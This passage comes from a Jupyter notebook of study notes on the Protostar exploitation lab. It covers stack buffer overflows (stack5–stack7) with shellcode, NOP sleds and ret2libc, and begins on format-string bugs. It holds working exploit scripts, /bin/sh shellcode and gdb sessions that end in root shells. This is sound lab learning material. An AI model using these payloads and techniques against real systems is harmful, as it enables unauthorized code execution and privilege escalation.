    "    padding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS' \n",
    "    # if we would continue the alphabet, TTTT=eip UUUU=esp\n",
    "    eip = struct.pack('I', 0xbffff7c0) # point the instruction pointer to esp and put the payload there \n",
    "    payload = '\\xcc'*4\n",
    "    print padding + eip + payload"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    $ python /home/user/exploit_stack5.py > /home/user/expl_stack5\n",
    "    $ gdb ./stack5\n",
    "    (gdb) disas main\n",
    "    Dump of assembler code for function main:\n",
    "    0x080483c4 <main+0>:\tpush   %ebp\n",
    "    0x080483c5 <main+1>:\tmov    %esp,%ebp\n",
    "    0x080483c7 <main+3>:\tand    $0xfffffff0,%esp\n",
    "    0x080483ca <main+6>:\tsub    $0x50,%esp\n",
    "    0x080483cd <main+9>:\tlea    0x10(%esp),%eax\n",
    "    0x080483d1 <main+13>:\tmov    %eax,(%esp)\n",
    "    0x080483d4 <main+16>:\tcall   0x80482e8 <gets@plt>\n",
    "    0x080483d9 <main+21>:\tleave  \n",
    "    0x080483da <main+22>:\tret    \n",
    "    (gdb) break *0x080483da\n",
    "    (gdb) run < /home/user/expl_stack5\n",
    "    Breakpoint 1, 0x080483da in main (argc=Cannot access memory at address 0x5353535b\n",
    "    ) at stack5/stack5.c:11\n",
    "    11\tstack5/stack5.c: No such file or directory.\n",
    "        in stack5/stack5.c\n",
    "    (gdb) continue\n",
    "    Continuing.\n",
    "    Program received signal SIGTRAP, Trace/breakpoint trap. <--- which is our opcode\n",
    "    (gdb) x/x 0xbffff7c1\n",
    "    0xbffff7c1:\t0x00cccccc\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now lets add the nops so it also works outside of gdb when the memory addresses are slightly different. NOP has the opcode \\x90"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "***exploit_stack5_v2.py***\n",
    "    import struct\n",
    "    padding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS' \n",
    "\n",
    "    # if we would continue the alphabet, TTTT=eip UUUU=esp\n",
    "    eip = struct.pack('I', 0xbffff7c0+50) # point the instruction pointer to esp and put the payload there \n",
    "    payload = \"\\x90\"*100 + '\\xcc'\n",
    "    print padding + eip + payloa"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "python /home/user/exploit_stack5_v2.py | ./stack5 <br>\n",
    "Trace/breakpoint trap <br>\n",
    "Nice, so we can actually manipulate the program with opcodes <br>\n",
    "Now lets use some shellcode instead of a simple interrupt. <br>\n",
    "Source: <br>\n",
    "http://shell-storm.org/shellcode/files/shellcode-811.php  <br>\n",
    "\n",
    "<pre>\n",
    "     8048060: 31 c0                 xor    %eax,%eax\n",
    "     8048062: 50                    push   %eax\n",
    "     8048063: 68 2f 2f 73 68        push   $0x68732f2f\n",
    "     8048068: 68 2f 62 69 6e        push   $0x6e69622f\n",
    "     804806d: 89 e3                 mov    %esp,%ebx\n",
    "     804806f: 89 c1                 mov    %eax,%ecx\n",
    "     8048071: 89 c2                 mov    %eax,%edx\n",
    "     8048073: b0 0b                 mov    $0xb,%al\n",
    "     8048075: cd 80                 int    $0x80\n",
    "     8048077: 31 c0                 xor    %eax,%eax\n",
    "     8048079: 40                    inc    %eax\n",
    "     804807a: cd 80                 int    $0x80\n",
    "\n",
    "    shellcode =  \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\"\n",
    "                 \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\"\n",
    "                 \"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\"\n",
    "                 \"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"\n",
    "\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    Testing the shellcode:\n",
    "    ***shellcode.s***\n",
    "        # Assembly code to open a shell\n",
    "        .data\n",
    "        \n",
    "        .text\n",
    "        \n",
    "        .globl _start\n",
    "        \n",
    "            _start:\n",
    "                xor    %eax,%eax\n",
    "                push   %eax\n",
    "                push   $0x68732f2f\n",
    "            push   $0x6e69622f\n",
    "                mov    %esp,%ebx\n",
    "                mov    %eax,%ecx\n",
    "                mov    %eax,%edx\n",
    "                mov    $0xb,%al\n",
    "            int    $0x80\n",
    "                xor    %eax,%eax\n",
    "                inc    %eax\n",
    "                int    $0x80"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "b'hs//'\n",
      "b'nib/'\n"
     ]
    }
   ],
   "source": [
    "import codecs\n",
    "print(codecs.decode(\"68732f2f\", 'hex'))\n",
    "print(codecs.decode(\"6e69622f\", 'hex'))\n",
    "#because of little endian the order is reversed. in the right order it reads: /bin//sh"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    $ as --32 -o shellcode.o shellcode.s\n",
    "    $ ld -m elf_i386 -o shellcode shellcode.o\n",
    "    $ ./shellcode \n",
    "    $ "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So now lets put this shellcode on the stack and execute it"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    *** exploit_stack5_v3.py ***\n",
    "    import struct\n",
    "    padding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS'\n",
    "    eip = struct.pack('I', 0xbffff7c0+50) # point the instruction pointer to esp\n",
    "    payload = '\\x90'*100 + \n",
    "    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\" + \n",
    "    \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\" + \n",
    "    \"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\" + \n",
    "    \"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"\n",
    "    print padding + eip + payload"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    $ python /home/user/exploit_stack5_v3.py | ./stack5\n",
    "    $\n",
    "    weird, nothing happened, we are still in bash instead of shell..."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "So far i did not realy get why. LiveOverflow explains it like this:\n",
    "A shell you execute wants some input from stdin but we used a program to pipe the stdout into the stdin. When the program was done, it closed the shell. The trick to get around that is to use \"cat\" which redirects the stdin to stdout\n",
    "This can be used in the following way:\n",
    "<pre>\n",
    "    (python /home/user/exploit_stack5_v3.py; cat) | ./stack5\n",
    "    whoami\n",
    "    ***root***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 15. Doing ret2libc with a Buffer Overflow because of restricted return pointer - bin 0x0F"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "getting some intuition of what the program does\n",
    "<pre>\n",
    "    $ ./stack6\n",
    "    input path please: abc\n",
    "    got path abc\n",
    "    \n",
    "    $ ./stack6 \n",
    "    input path please: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL\n",
    "    MMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXX\n",
    "    got path AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL\n",
    "    MMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXX\n",
    "    Segmentation fault\n",
    "    \n",
    "    ok so it takes some input and writes it. since we get a segmentation fault with long inputs \n",
    "    probably gets is used which we could abuse for a buffer overflow\n",
    "    \n",
    "    (gdb) info functions\n",
    "    void getpath(void);\n",
    "    int main(int, char **);"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    (gdb) disas main\n",
    "    Dump of assembler code for function main:\n",
    "    0x080484fa < main+0 >:    push   %ebp\n",
    "    0x080484fb < main+1 >:    mov    %esp,%ebp\n",
    "    0x080484fd < main+3 >:    and    $0xfffffff0,%esp\n",
    "    0x08048500 < main+6 >:    call   0x8048484 < getpath >\n",
    "    0x08048505 < main+11 >:   mov    %ebp,%esp\n",
    "    0x08048507 < main+13 >:   pop    %ebp\n",
    "    0x08048508 < main+14 >:   ret\n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    (gdb) disas getpath\n",
    "    Dump of assembler code for function getpath:\n",
    "    0x08048484 < getpath+0 >:   push   %ebp\n",
    "    0x08048485 < getpath+1 >:   mov    %esp,%ebp\n",
    "    0x08048487 < getpath+3 >:   sub    $0x68,%esp # buffer of 104 bytes\n",
    "    0x0804848a < getpath+6 >:   mov    $0x80485d0,%eax # \"input path please: \" is at $0x80485d0\n",
    "    0x0804848f < getpath+11 >:  mov    %eax,(%esp)\n",
    "    0x08048492 < getpath+14 >:  call   0x80483c0 < printf@plt > print \"input path please: \"\n",
    "    0x08048497 < getpath+19 >:  mov    0x8049720,%eax\n",
    "    0x0804849c < getpath+24 >:  mov    %eax,(%esp)\n",
    "    0x0804849f < getpath+27 >:  call   0x80483b0 < fflush@plt >\n",
    "    0x080484a4 < getpath+32 >:  lea    -0x4c(%ebp),%eax\n",
    "    0x080484a7 < getpath+35 >:  mov    %eax,(%esp)\n",
    "    0x080484aa < getpath+38 >:  call   0x8048380 < gets@plt >\n",
    "    0x080484af < getpath+43 >:  mov    0x4(%ebp),%eax # 0x4(%ebp) = return address (next main fct instr)\n",
    "    0x080484b2 < getpath+46 >:  mov    %eax,-0xc(%ebp)\n",
    "    0x080484b5 < getpath+49 >:  mov    -0xc(%ebp),%eax\n",
    "    0x080484b8 < getpath+52 >:  and    $0xbf000000,%eax # look if the memory address starts with 0xbf\n",
    "    0x080484bd < getpath+57 >:  cmp    $0xbf000000,%eax # if so, print \"bzzzt (%p)\\n\" and exit   \n",
    "                                                        # denies standard buffer overflows\n",
    "    0x080484c2 < getpath+62 >:  jne    0x80484e4 < getpath+96 >\n",
    "    0x080484c4 < getpath+64 >:  mov    $0x80485e4,%eax\n",
    "    0x080484c9 < getpath+69 >:  mov    -0xc(%ebp),%edx\n",
    "    0x080484cc < getpath+72 >:  mov    %edx,0x4(%esp)\n",
    "    0x080484d0 < getpath+76 >:  mov    %eax,(%esp)\n",
    "    0x080484d3 < getpath+79 >:  call   0x80483c0 < printf@plt >\n",
    "    0x080484d8 < getpath+84 >:  movl   $0x1,(%esp)\n",
    "    0x080484df < getpath+91 >:  call   0x80483a0 < _exit@plt >\n",
    "    0x080484e4 < getpath+96 >:  mov    $0x80485f0,%eax\n",
    "    0x080484e9 < getpath+101 >: lea    -0x4c(%ebp),%edx\n",
    "    0x080484ec < getpath+104 >: mov    %edx,0x4(%esp)\n",
    "    0x080484f0 < getpath+108 >: mov    %eax,(%esp)\n",
    "    0x080484f3 < getpath+111 >: call   0x80483c0 < printf@plt >\n",
    "    0x080484f8 < getpath+116 >: leave  \n",
    "    0x080484f9 < getpath+117 >: ret "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "0x080484af < getpath+43 > to 0x080484c2 < getpath+62 > look if the return address points to the stack (0xbf) and if so, stop the program. This denies to simply overwrite the return address to manipulate the instruction pointer\n",
    "\n",
    "<pre>\n",
    "    0x080484af < getpath+43 >:  mov    0x4(%ebp),%eax # 0x4(%ebp) = return address (next main fct instr)\n",
    "    0x080484b2 < getpath+46 >:  mov    %eax,-0xc(%ebp)\n",
    "    0x080484b5 < getpath+49 >:  mov    -0xc(%ebp),%eax\n",
    "    0x080484b8 < getpath+52 >:  and    $0xbf000000,%eax # look if 0x4(%ebp) address starts with 0xbf\n",
    "    since the memory address of 0x4(%ebp) is checked writing our alphabet results in \n",
    "    (gdb) x/x $ebp-0x4\n",
    "    0xbffff7a4:\t0x53535353\n",
    "    \n",
    "    (gdb) x/x $ebp-0x4\n",
    "    0xbffff7a4:\t0xb7ff1040\n",
    "    \n",
    "    Program received signal SIGSEGV, Segmentation fault.\n",
    "    0x55555555 in"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    (gdb) break *0x08048508\n",
    "    (gdb) run\n",
    "    input path please: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLL\n",
    "    MMMMNNNNOOOOPPPPUUUURRRRSSSSTTTTUUUUVVVVWWWWXXXX\n",
    "    (gdb) info registers\n",
    "    esp            0xbffff7b0\t0xbffff7b0\n",
    "    ebp            0x54545454\t0x54545454\n",
    "    eip            0x55555555\t0x55555555\n",
    "    x/x $esp\n",
    "    0xbffff7b0:\t0x56565656\n",
    "    We can manipulate ebp, eip and the content of esp. \n",
    "    The details for it are as follows.\n",
    "    We write the alphabet on the stack.\n",
    "    when entering a function the stack frame is set up by:\n",
    "    push %ebp\n",
    "    mov %esp, %ebp\n",
    "\n",
    "    when executing 0x080484f8 < getpath+116 >: leave:\n",
    "    mov %ebp, %esp\n",
    "    pop %ebp which takes to manipulated stack value and writes it into ebp\n",
    "    \n",
    "    when executing 0x080484f9 < getpath+117 >: ret\n",
    "    the manipulated value at $esp is written into $eip\n",
    "    \n",
    "    Main does nothing but calling the getpath function. Lets take a look at it"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    ebp gets overwritten by the T's, the return address/eip=UUUU, and the first value at esp is VVVV\n",
    "\n",
    "    So, we can control eip as long as it does not start with bf\n",
    "    unfortunately the stack is at bf so we cant point to our shellcode\n",
    "\n",
    "    What about pointing to the .text section so just behind ret?\n",
    "    Unfortunately \"gets\" places the input only on the stack and we cant reach the .text section with our input.\n",
    "    Lets not completly reject the idea, we will use it in the second approach.\n",
    "\n",
    "    Idea for the first approach: the ret function pops the content placed at \n",
    "    $esp of the stack and writes it into eip.\n",
    "    So what if we place 0x080484f9 at $esp so the comparison with $0xbf000000 says that we do not point to the stack but to the .text segment instead?\n",
    "    and at the next address $esp+4 we point to the stack?\n",
    "    ret will return to itself, delete 0x080484f9 from the stack and return to the address we have placed as the second value on the stack (which points to the shellcode).\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    ***exploit_stack6.py***\n",
    "    import struct\n",
    "    padding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'\n",
    "    eip = struct.pack('I', 0xbffff7c0+40)\n",
    "    ret = struct.pack('I', 0x080484f9)\n",
    "    payload = '\\x90'*100 + \n",
    "    \"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\" + \n",
    "    \"\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\" + \n",
    "    \"\\xe3\\x89\\xc1\\x89\\xc2\\xb0\\x0b\" + \n",
    "    \"\\xcd\\x80\\x31\\xc0\\x40\\xcd\\x80\"\n",
    "\n",
    "    print padding + ret + eip + payload\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    $ (python /home/user/exploit_stack6_v2.py;cat) | ./stack6\n",
    "    whoami\n",
    "    ***root***"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "The second approach is to abuse the .text segment itself. Specifically the libc library. This library contains the function \"system\" which can execute a shell command. So why not let it execute \"/bin/sh\"?\n",
    "Lets see what has to be done to execute this command."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***libc_test.c***\n",
    "<pre>\n",
    "    #include <stdlib.h>\n",
    "\n",
    "    int main(){\n",
    "            system(\"/bin/sh\");\n",
    "            return 0;\n",
    "    }"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    $ gcc -o libc_test libc_test.c\n",
    "    $(gdb) disas main\n",
    "    0x080483c4 < main+0 >:    push   %ebp\n",
    "    0x080483c5 < main+1 >:    mov    %esp,%ebp\n",
    "    0x080483c7 < main+3 >:    and    $0xfffffff0,%esp\n",
    "    0x080483ca < main+6 >:    sub    $0x10,%esp\n",
    "    0x080483cd < main+9 >:    movl   $0x80484a0,(%esp)\n",
    "    0x080483d4 < main+16 >:   call   0x80482ec <system@plt>\n",
    "    0x080483d9 < main+21 >:   mov    $0x0,%eax\n",
    "    0x080483de < main+26 >:   leave  \n",
    "    0x080483df < main+27 >:   ret \n",
    "    (gdb) x/s 0x80484a0\n",
    "    0x80484a0:\t \"/bin/sh\"\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "esp has to point to the string and the instruction pointer has to point to system.\n",
    "<pre>\n",
    "    $gdb ./stack6\n",
    "    (gdb) break *0x080484f9\n",
    "    (gdb) run\n",
    "    ABC\n",
    "    (gdb) info proc map\n",
    "    process 8728\n",
    "    cmdline = '/opt/protostar/bin/stack6'\n",
    "    cwd = '/opt/protostar/bin'\n",
    "    exe = '/opt/protostar/bin/stack6'\n",
    "    Mapped address spaces:\n",
    "\n",
    "\tStart Addr   End Addr       Size     Offset objfile\n",
    "\t0x8048000  0x8049000     0x1000          0        /opt/protostar/bin/stack6\n",
    "\t0x8049000  0x804a000     0x1000          0        /opt/protostar/bin/stack6\n",
    "\t0xb7e96000 0xb7e97000     0x1000          0        \n",
    "\t0xb7e97000 0xb7fd5000   0x13e000          0         /lib/libc-2.11.2.so\n",
    "\t0xb7fd5000 0xb7fd6000     0x1000   0x13e000         /lib/libc-2.11.2.so\n",
    "\t0xb7fd6000 0xb7fd8000     0x2000   0x13e000         /lib/libc-2.11.2.so\n",
    "\t0xb7fd8000 0xb7fd9000     0x1000   0x140000         /lib/libc-2.11.2.so\n",
    "\t0xb7fd9000 0xb7fdc000     0x3000          0        \n",
    "\t0xb7fde000 0xb7fe2000     0x4000          0        \n",
    "\t0xb7fe2000 0xb7fe3000     0x1000          0           [vdso]\n",
    "\t0xb7fe3000 0xb7ffe000    0x1b000          0         /lib/ld-2.11.2.so\n",
    "\t0xb7ffe000 0xb7fff000     0x1000    0x1a000         /lib/ld-2.11.2.so\n",
    "\t0xb7fff000 0xb8000000     0x1000    0x1b000         /lib/ld-2.11.2.so\n",
    "\t0xbffeb000 0xc0000000    0x15000          0           [stack]\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    libc ranges from 0xb7e97000 to 0xb7fd9000\n",
    "    (gdb) find 0xb7e97000, 0xb7fd9000, \"/bin/sh\"\n",
    "    0xb7fba23f\n",
    "    1 pattern found.\n",
    "    For some reason the output of this gdb address is wrong\n",
    "    (gdb) x/s 0xb7fba23f\n",
    "    0xb7fba23f:\t \"KIND in __gen_tempname\\\"\"\n",
    "\n",
    "    user@protostar:~$ strings -a -t x /lib/libc-2.11.2.so | grep \"/bin/sh\"\n",
    "     11f3bf /bin/sh\n",
    "    (gdb) x/s 0xb7e97000+0x11f3bf\n",
    "    0xb7fb63bf:\t \"/bin/sh\"\n",
    "    (gdb) x/x system\n",
    "    0xb7ecffb0 <__libc_system>:\t0x890cec83"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "eip has to point to 0xb7ecffb0 and esp has to point to 0xb7fb63bf"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***exploit_stack6_v3.py***\n",
    "<pre>\n",
    "    import struct\n",
    "    padding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'\n",
    "    sys_pointer = struct.pack('I', 0xb7ecffb0)\n",
    "    padding2 = 'ABCD'\n",
    "    bin_sh_pointer = struct.pack('I', 0xb7fb63bf)\n",
    "\n",
    "\n",
    "    print padding + sys_pointer + padding2 + bin_sh_pointer"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    user@protostar:/opt/protostar/bin$ (python /home/user/exploit_stack6_v3.py; cat) | ./stack6\n",
    "    whoami\n",
    "    root\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 15.2 Protostar stack7"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    user@protostar:/opt/protostar/bin$ ./stack7\n",
    "    input path please: abc\n",
    "    got path abc\n",
    "    seems like stack6"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    $ ./stack7\n",
    "    (gdb)  info functions\n",
    "    char *getpath(void);\n",
    "    int main(int, char **);\n",
    "    (gdb) disas main\n",
    "    Dump of assembler code for function main:\n",
    "    0x08048545 <main+0>:\tpush   %ebp\n",
    "    0x08048546 <main+1>:\tmov    %esp,%ebp\n",
    "    0x08048548 <main+3>:\tand    $0xfffffff0,%esp\n",
    "    0x0804854b <main+6>:\tcall   0x80484c4 <getpath>\n",
    "    0x08048550 <main+11>:\tmov    %ebp,%esp\n",
    "    0x08048552 <main+13>:\tpop    %ebp\n",
    "    0x08048553 <main+14>:\tret    \n",
    "    so main is the same as stack6\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    0x080484c4 < getpath+0 >:\tpush   %ebp\n",
    "    0x080484c5 < getpath+1 >:\tmov    %esp,%ebp\n",
    "    0x080484c7 < getpath+3 >:\tsub    $0x68,%esp\n",
    "    0x080484ca < getpath+6 >:\tmov    $0x8048620,%eax\n",
    "    0x080484cf < getpath+11 >:\tmov    %eax,(%esp)\n",
    "    0x080484d2 < getpath+14 >:\tcall   0x80483e4 < printf@plt >\n",
    "    0x080484d7 < getpath+19 >:\tmov    0x8049780,%eax\n",
    "    0x080484dc < getpath+24 >:\tmov    %eax,(%esp)\n",
    "    0x080484df < getpath+27 >:\tcall   0x80483d4 < fflush@plt >\n",
    "    0x080484e4 < getpath+32 >:\tlea    -0x4c(%ebp),%eax\n",
    "    0x080484e7 < getpath+35 >:\tmov    %eax,(%esp)\n",
    "    0x080484ea < getpath+38 >:\tcall   0x80483a4 < gets@plt >\n",
    "    0x080484ef < getpath+43 >:\tmov    0x4(%ebp),%eax\n",
    "    0x080484f2 < getpath+46 >:\tmov    %eax,-0xc(%ebp)\n",
    "    0x080484f5 < getpath+49 >:\tmov    -0xc(%ebp),%eax\n",
    "    0x080484f8 < getpath+52 >:\tand    $0xb0000000,%eax\n",
    "    0x080484fd < getpath+57 >:\tcmp    $0xb0000000,%eax\n",
    "    0x08048502 < getpath+62 >:\tjne    0x8048524 < getpath+96 >\n",
    "    0x08048504 < getpath+64 >:\tmov    $0x8048634,%eax\n",
    "    0x08048509 < getpath+69 >:\tmov    -0xc(%ebp),%edx\n",
    "    0x0804850c < getpath+72 >:\tmov    %edx,0x4(%esp)\n",
    "    0x08048510 < getpath+76 >:\tmov    %eax,(%esp)\n",
    "    0x08048513 < getpath+79 >:\tcall   0x80483e4 < printf@plt >\n",
    "    0x08048518 < getpath+84 >:\tmovl   $0x1,(%esp)\n",
    "    0x0804851f < getpath+91 >:\tcall   0x80483c4 < _exit@plt >\n",
    "    0x08048524 < getpath+96 >:\tmov    $0x8048640,%eax\n",
    "    0x08048529 < getpath+101 >:\tlea    -0x4c(%ebp),%edx\n",
    "    0x0804852c < getpath+104 >:\tmov    %edx,0x4(%esp)\n",
    "    0x08048530 < getpath+108 >:\tmov    %eax,(%esp)\n",
    "    0x08048533 < getpath+111 >:\tcall   0x80483e4 < printf@plt >\n",
    "    0x08048538 < getpath+116 >:\tlea    -0x4c(%ebp),%eax\n",
    "    0x0804853b < getpath+119 >:\tmov    %eax,(%esp)\n",
    "    0x0804853e < getpath+122 >:\tcall   0x80483f4 < strdup@plt >\n",
    "    0x08048543 < getpath+127 >:\tleave  \n",
    "    0x08048544 < getpath+128 >:\tret"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    $ gdb ./stack6\n",
    "    (gdb) break *0x08048544\n",
    "    (gdb) run\n",
    "    input path please: AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNN\n",
    "    OOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYY\n",
    "    ebp            0x54545454\t0x54545454\n",
    "    (gdb) x/x $esp\n",
    "    0xbffff7ac:\t0x55555555\n",
    "    (gdb) x/x $esp\n",
    "    0xbffff7b0:\t0x56565656\n",
    "    ni\n",
    "    eip            0x55555555\t0x55555555\n",
    "    UUUU = eip\n",
    "    TTTT = ebp\n",
    "    VVVV = content of esp after return address gets popped"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***exploit_stack7.py***\n",
    "<pre>\n",
    "    import struct\n",
    "    import struct\n",
    "    padding = 'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTT'\n",
    "    ret_pointer = struct.pack('I', 0x08048544)\n",
    "    sys_pointer = struct.pack('I', 0xb7ecffb0)\n",
    "    padding2 = 'ABCD'\n",
    "    bin_sh_pointer = struct.pack('I', 0xb7fb63bf)\n",
    "\n",
    "\n",
    "    print padding + ret_pointer + sys_pointer + padding2 + bin_sh_pointer\n",
    "\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    (python /home/user/exploit_stack7.py; cat) | ./stack7\n",
    "    Segmentation fault\n",
    "    whoami\n",
    "    root"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    the only difference to the old exploit using libc is that libc is placed in \n",
    "    0xb7e97000 - 0xb7fd9000 and the program compares in lines \n",
    "    0x080484f8 < getpath+52 >:\tand    $0xb0000000,%eax\n",
    "    0x080484fd < getpath+57 >:\tcmp    $0xb0000000,%eax\n",
    "    if the return pointer maps to 0xb which includes libc. So we combine both tricks of stack6. Point the return pointer to itself so we get over the comparison and afterwards point to libc system."
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 16. Reverse engineering C programs - bin 0x10"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "123 808 format string test\n"
     ]
    }
   ],
   "source": [
    "print(\"%d %x %s\" % (123, 2056, \"format string test\"))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 17. A simple Format String exploit example -bin 0x11"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    int printf(const char *format, ...) # the *format is the so called format string\n",
    "    e.g. printf(\"Knock, knock, %s\\n\", argv[1]); would be the right implementation.\n",
    "    If someone implements it like this: printf(argv[1]), placeholder like %s can be provided \n",
    "    without a corresponding value after the comma. \n",
    "    \n",
    "    If a string like \"%s %s\" is provided, two variables from the stack get printed but since we only\n",
    "    provided one program argument, we can read another variable from the stack\n",
    "    user@protostar:/opt/protostar/bin$ ./format1 %d\n",
    "    134518284\n",
    "    user@protostar:/opt/protostar/bin$ ./format1 %x\n",
    "    804960\n",
    "    $ ./format1 \"abc %s %s\"\n",
    "    abc 8����� h���v���\u0002u\n",
    "    $ ./format1 \"%x %x %x\"\n",
    "    804960c bffff7e8 8048469\n",
    "    this allows us to read the stack, which is a memory volnurability"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Testing %n\n",
    "lets test to provide %n which is able to write on the stack. e.g. \"AAAA%n\" counts the number of chars before %n, in this case 4, and writes this on the stack"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "***format_test1.c***\n",
    "<pre>\n",
    "    #include <stdio.h>\n",
    "\n",
    "    int main(int argc, char* argv[])\n",
    "    {\n",
    "            volatile int val;\n",
    "            printf(argv[1], &val);\n",
    "            printf(\"\\n\");\n",
    "            return 0;\n",
    "    }"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "<pre>\n",
    "    (gdb) disas main\n",
    "    0x080483f4 < main+0 >:    push   %ebp\n",
    "    0x080483f5 < main+1 >:    mov    %esp,%ebp\n",
    "    0x080483f7 < main+3 >:    and    $0xfffffff0,%esp\n",
    "    0x080483fa < main+6 >:    sub    $0x20,%esp\n",
    "    0x080483fd < main+9 >:    mov    0xc(%ebp),%eax\n",
    "    0x08048400 < main+12 >:   add    $0x4,%eax\n",
    "    0x08048403 < main+15 >:   mov    (%eax),%eax\n",
    "    0x08048405 < main+17 >:   lea    0x1c(%esp),%edx\n",
    "    0x08048409 < main+21 >:   mov    %edx,0x4(%esp)\n",
    "    0x0804840d < main+25 >:   mov    %eax,(%esp)\n",
    "    0x08048410 < main+28 >:   call   0x8048330 <printf@plt>\n",
    "    0x08048415 < main+33 >:   movl   $0xa,(%esp)\n",
    "    0x0804841c < main+40 >:   call   0x8048310 <putchar@plt>\n",
    "    0x08048421 < main+45 >:   mov    $0x0,%eax\n",
    "    0x08048426 < main+50 >:   leave  \n",
    "    0x08048427 < main+51 >:   ret \n",
    "    (gdb) break *0x08048415\n",
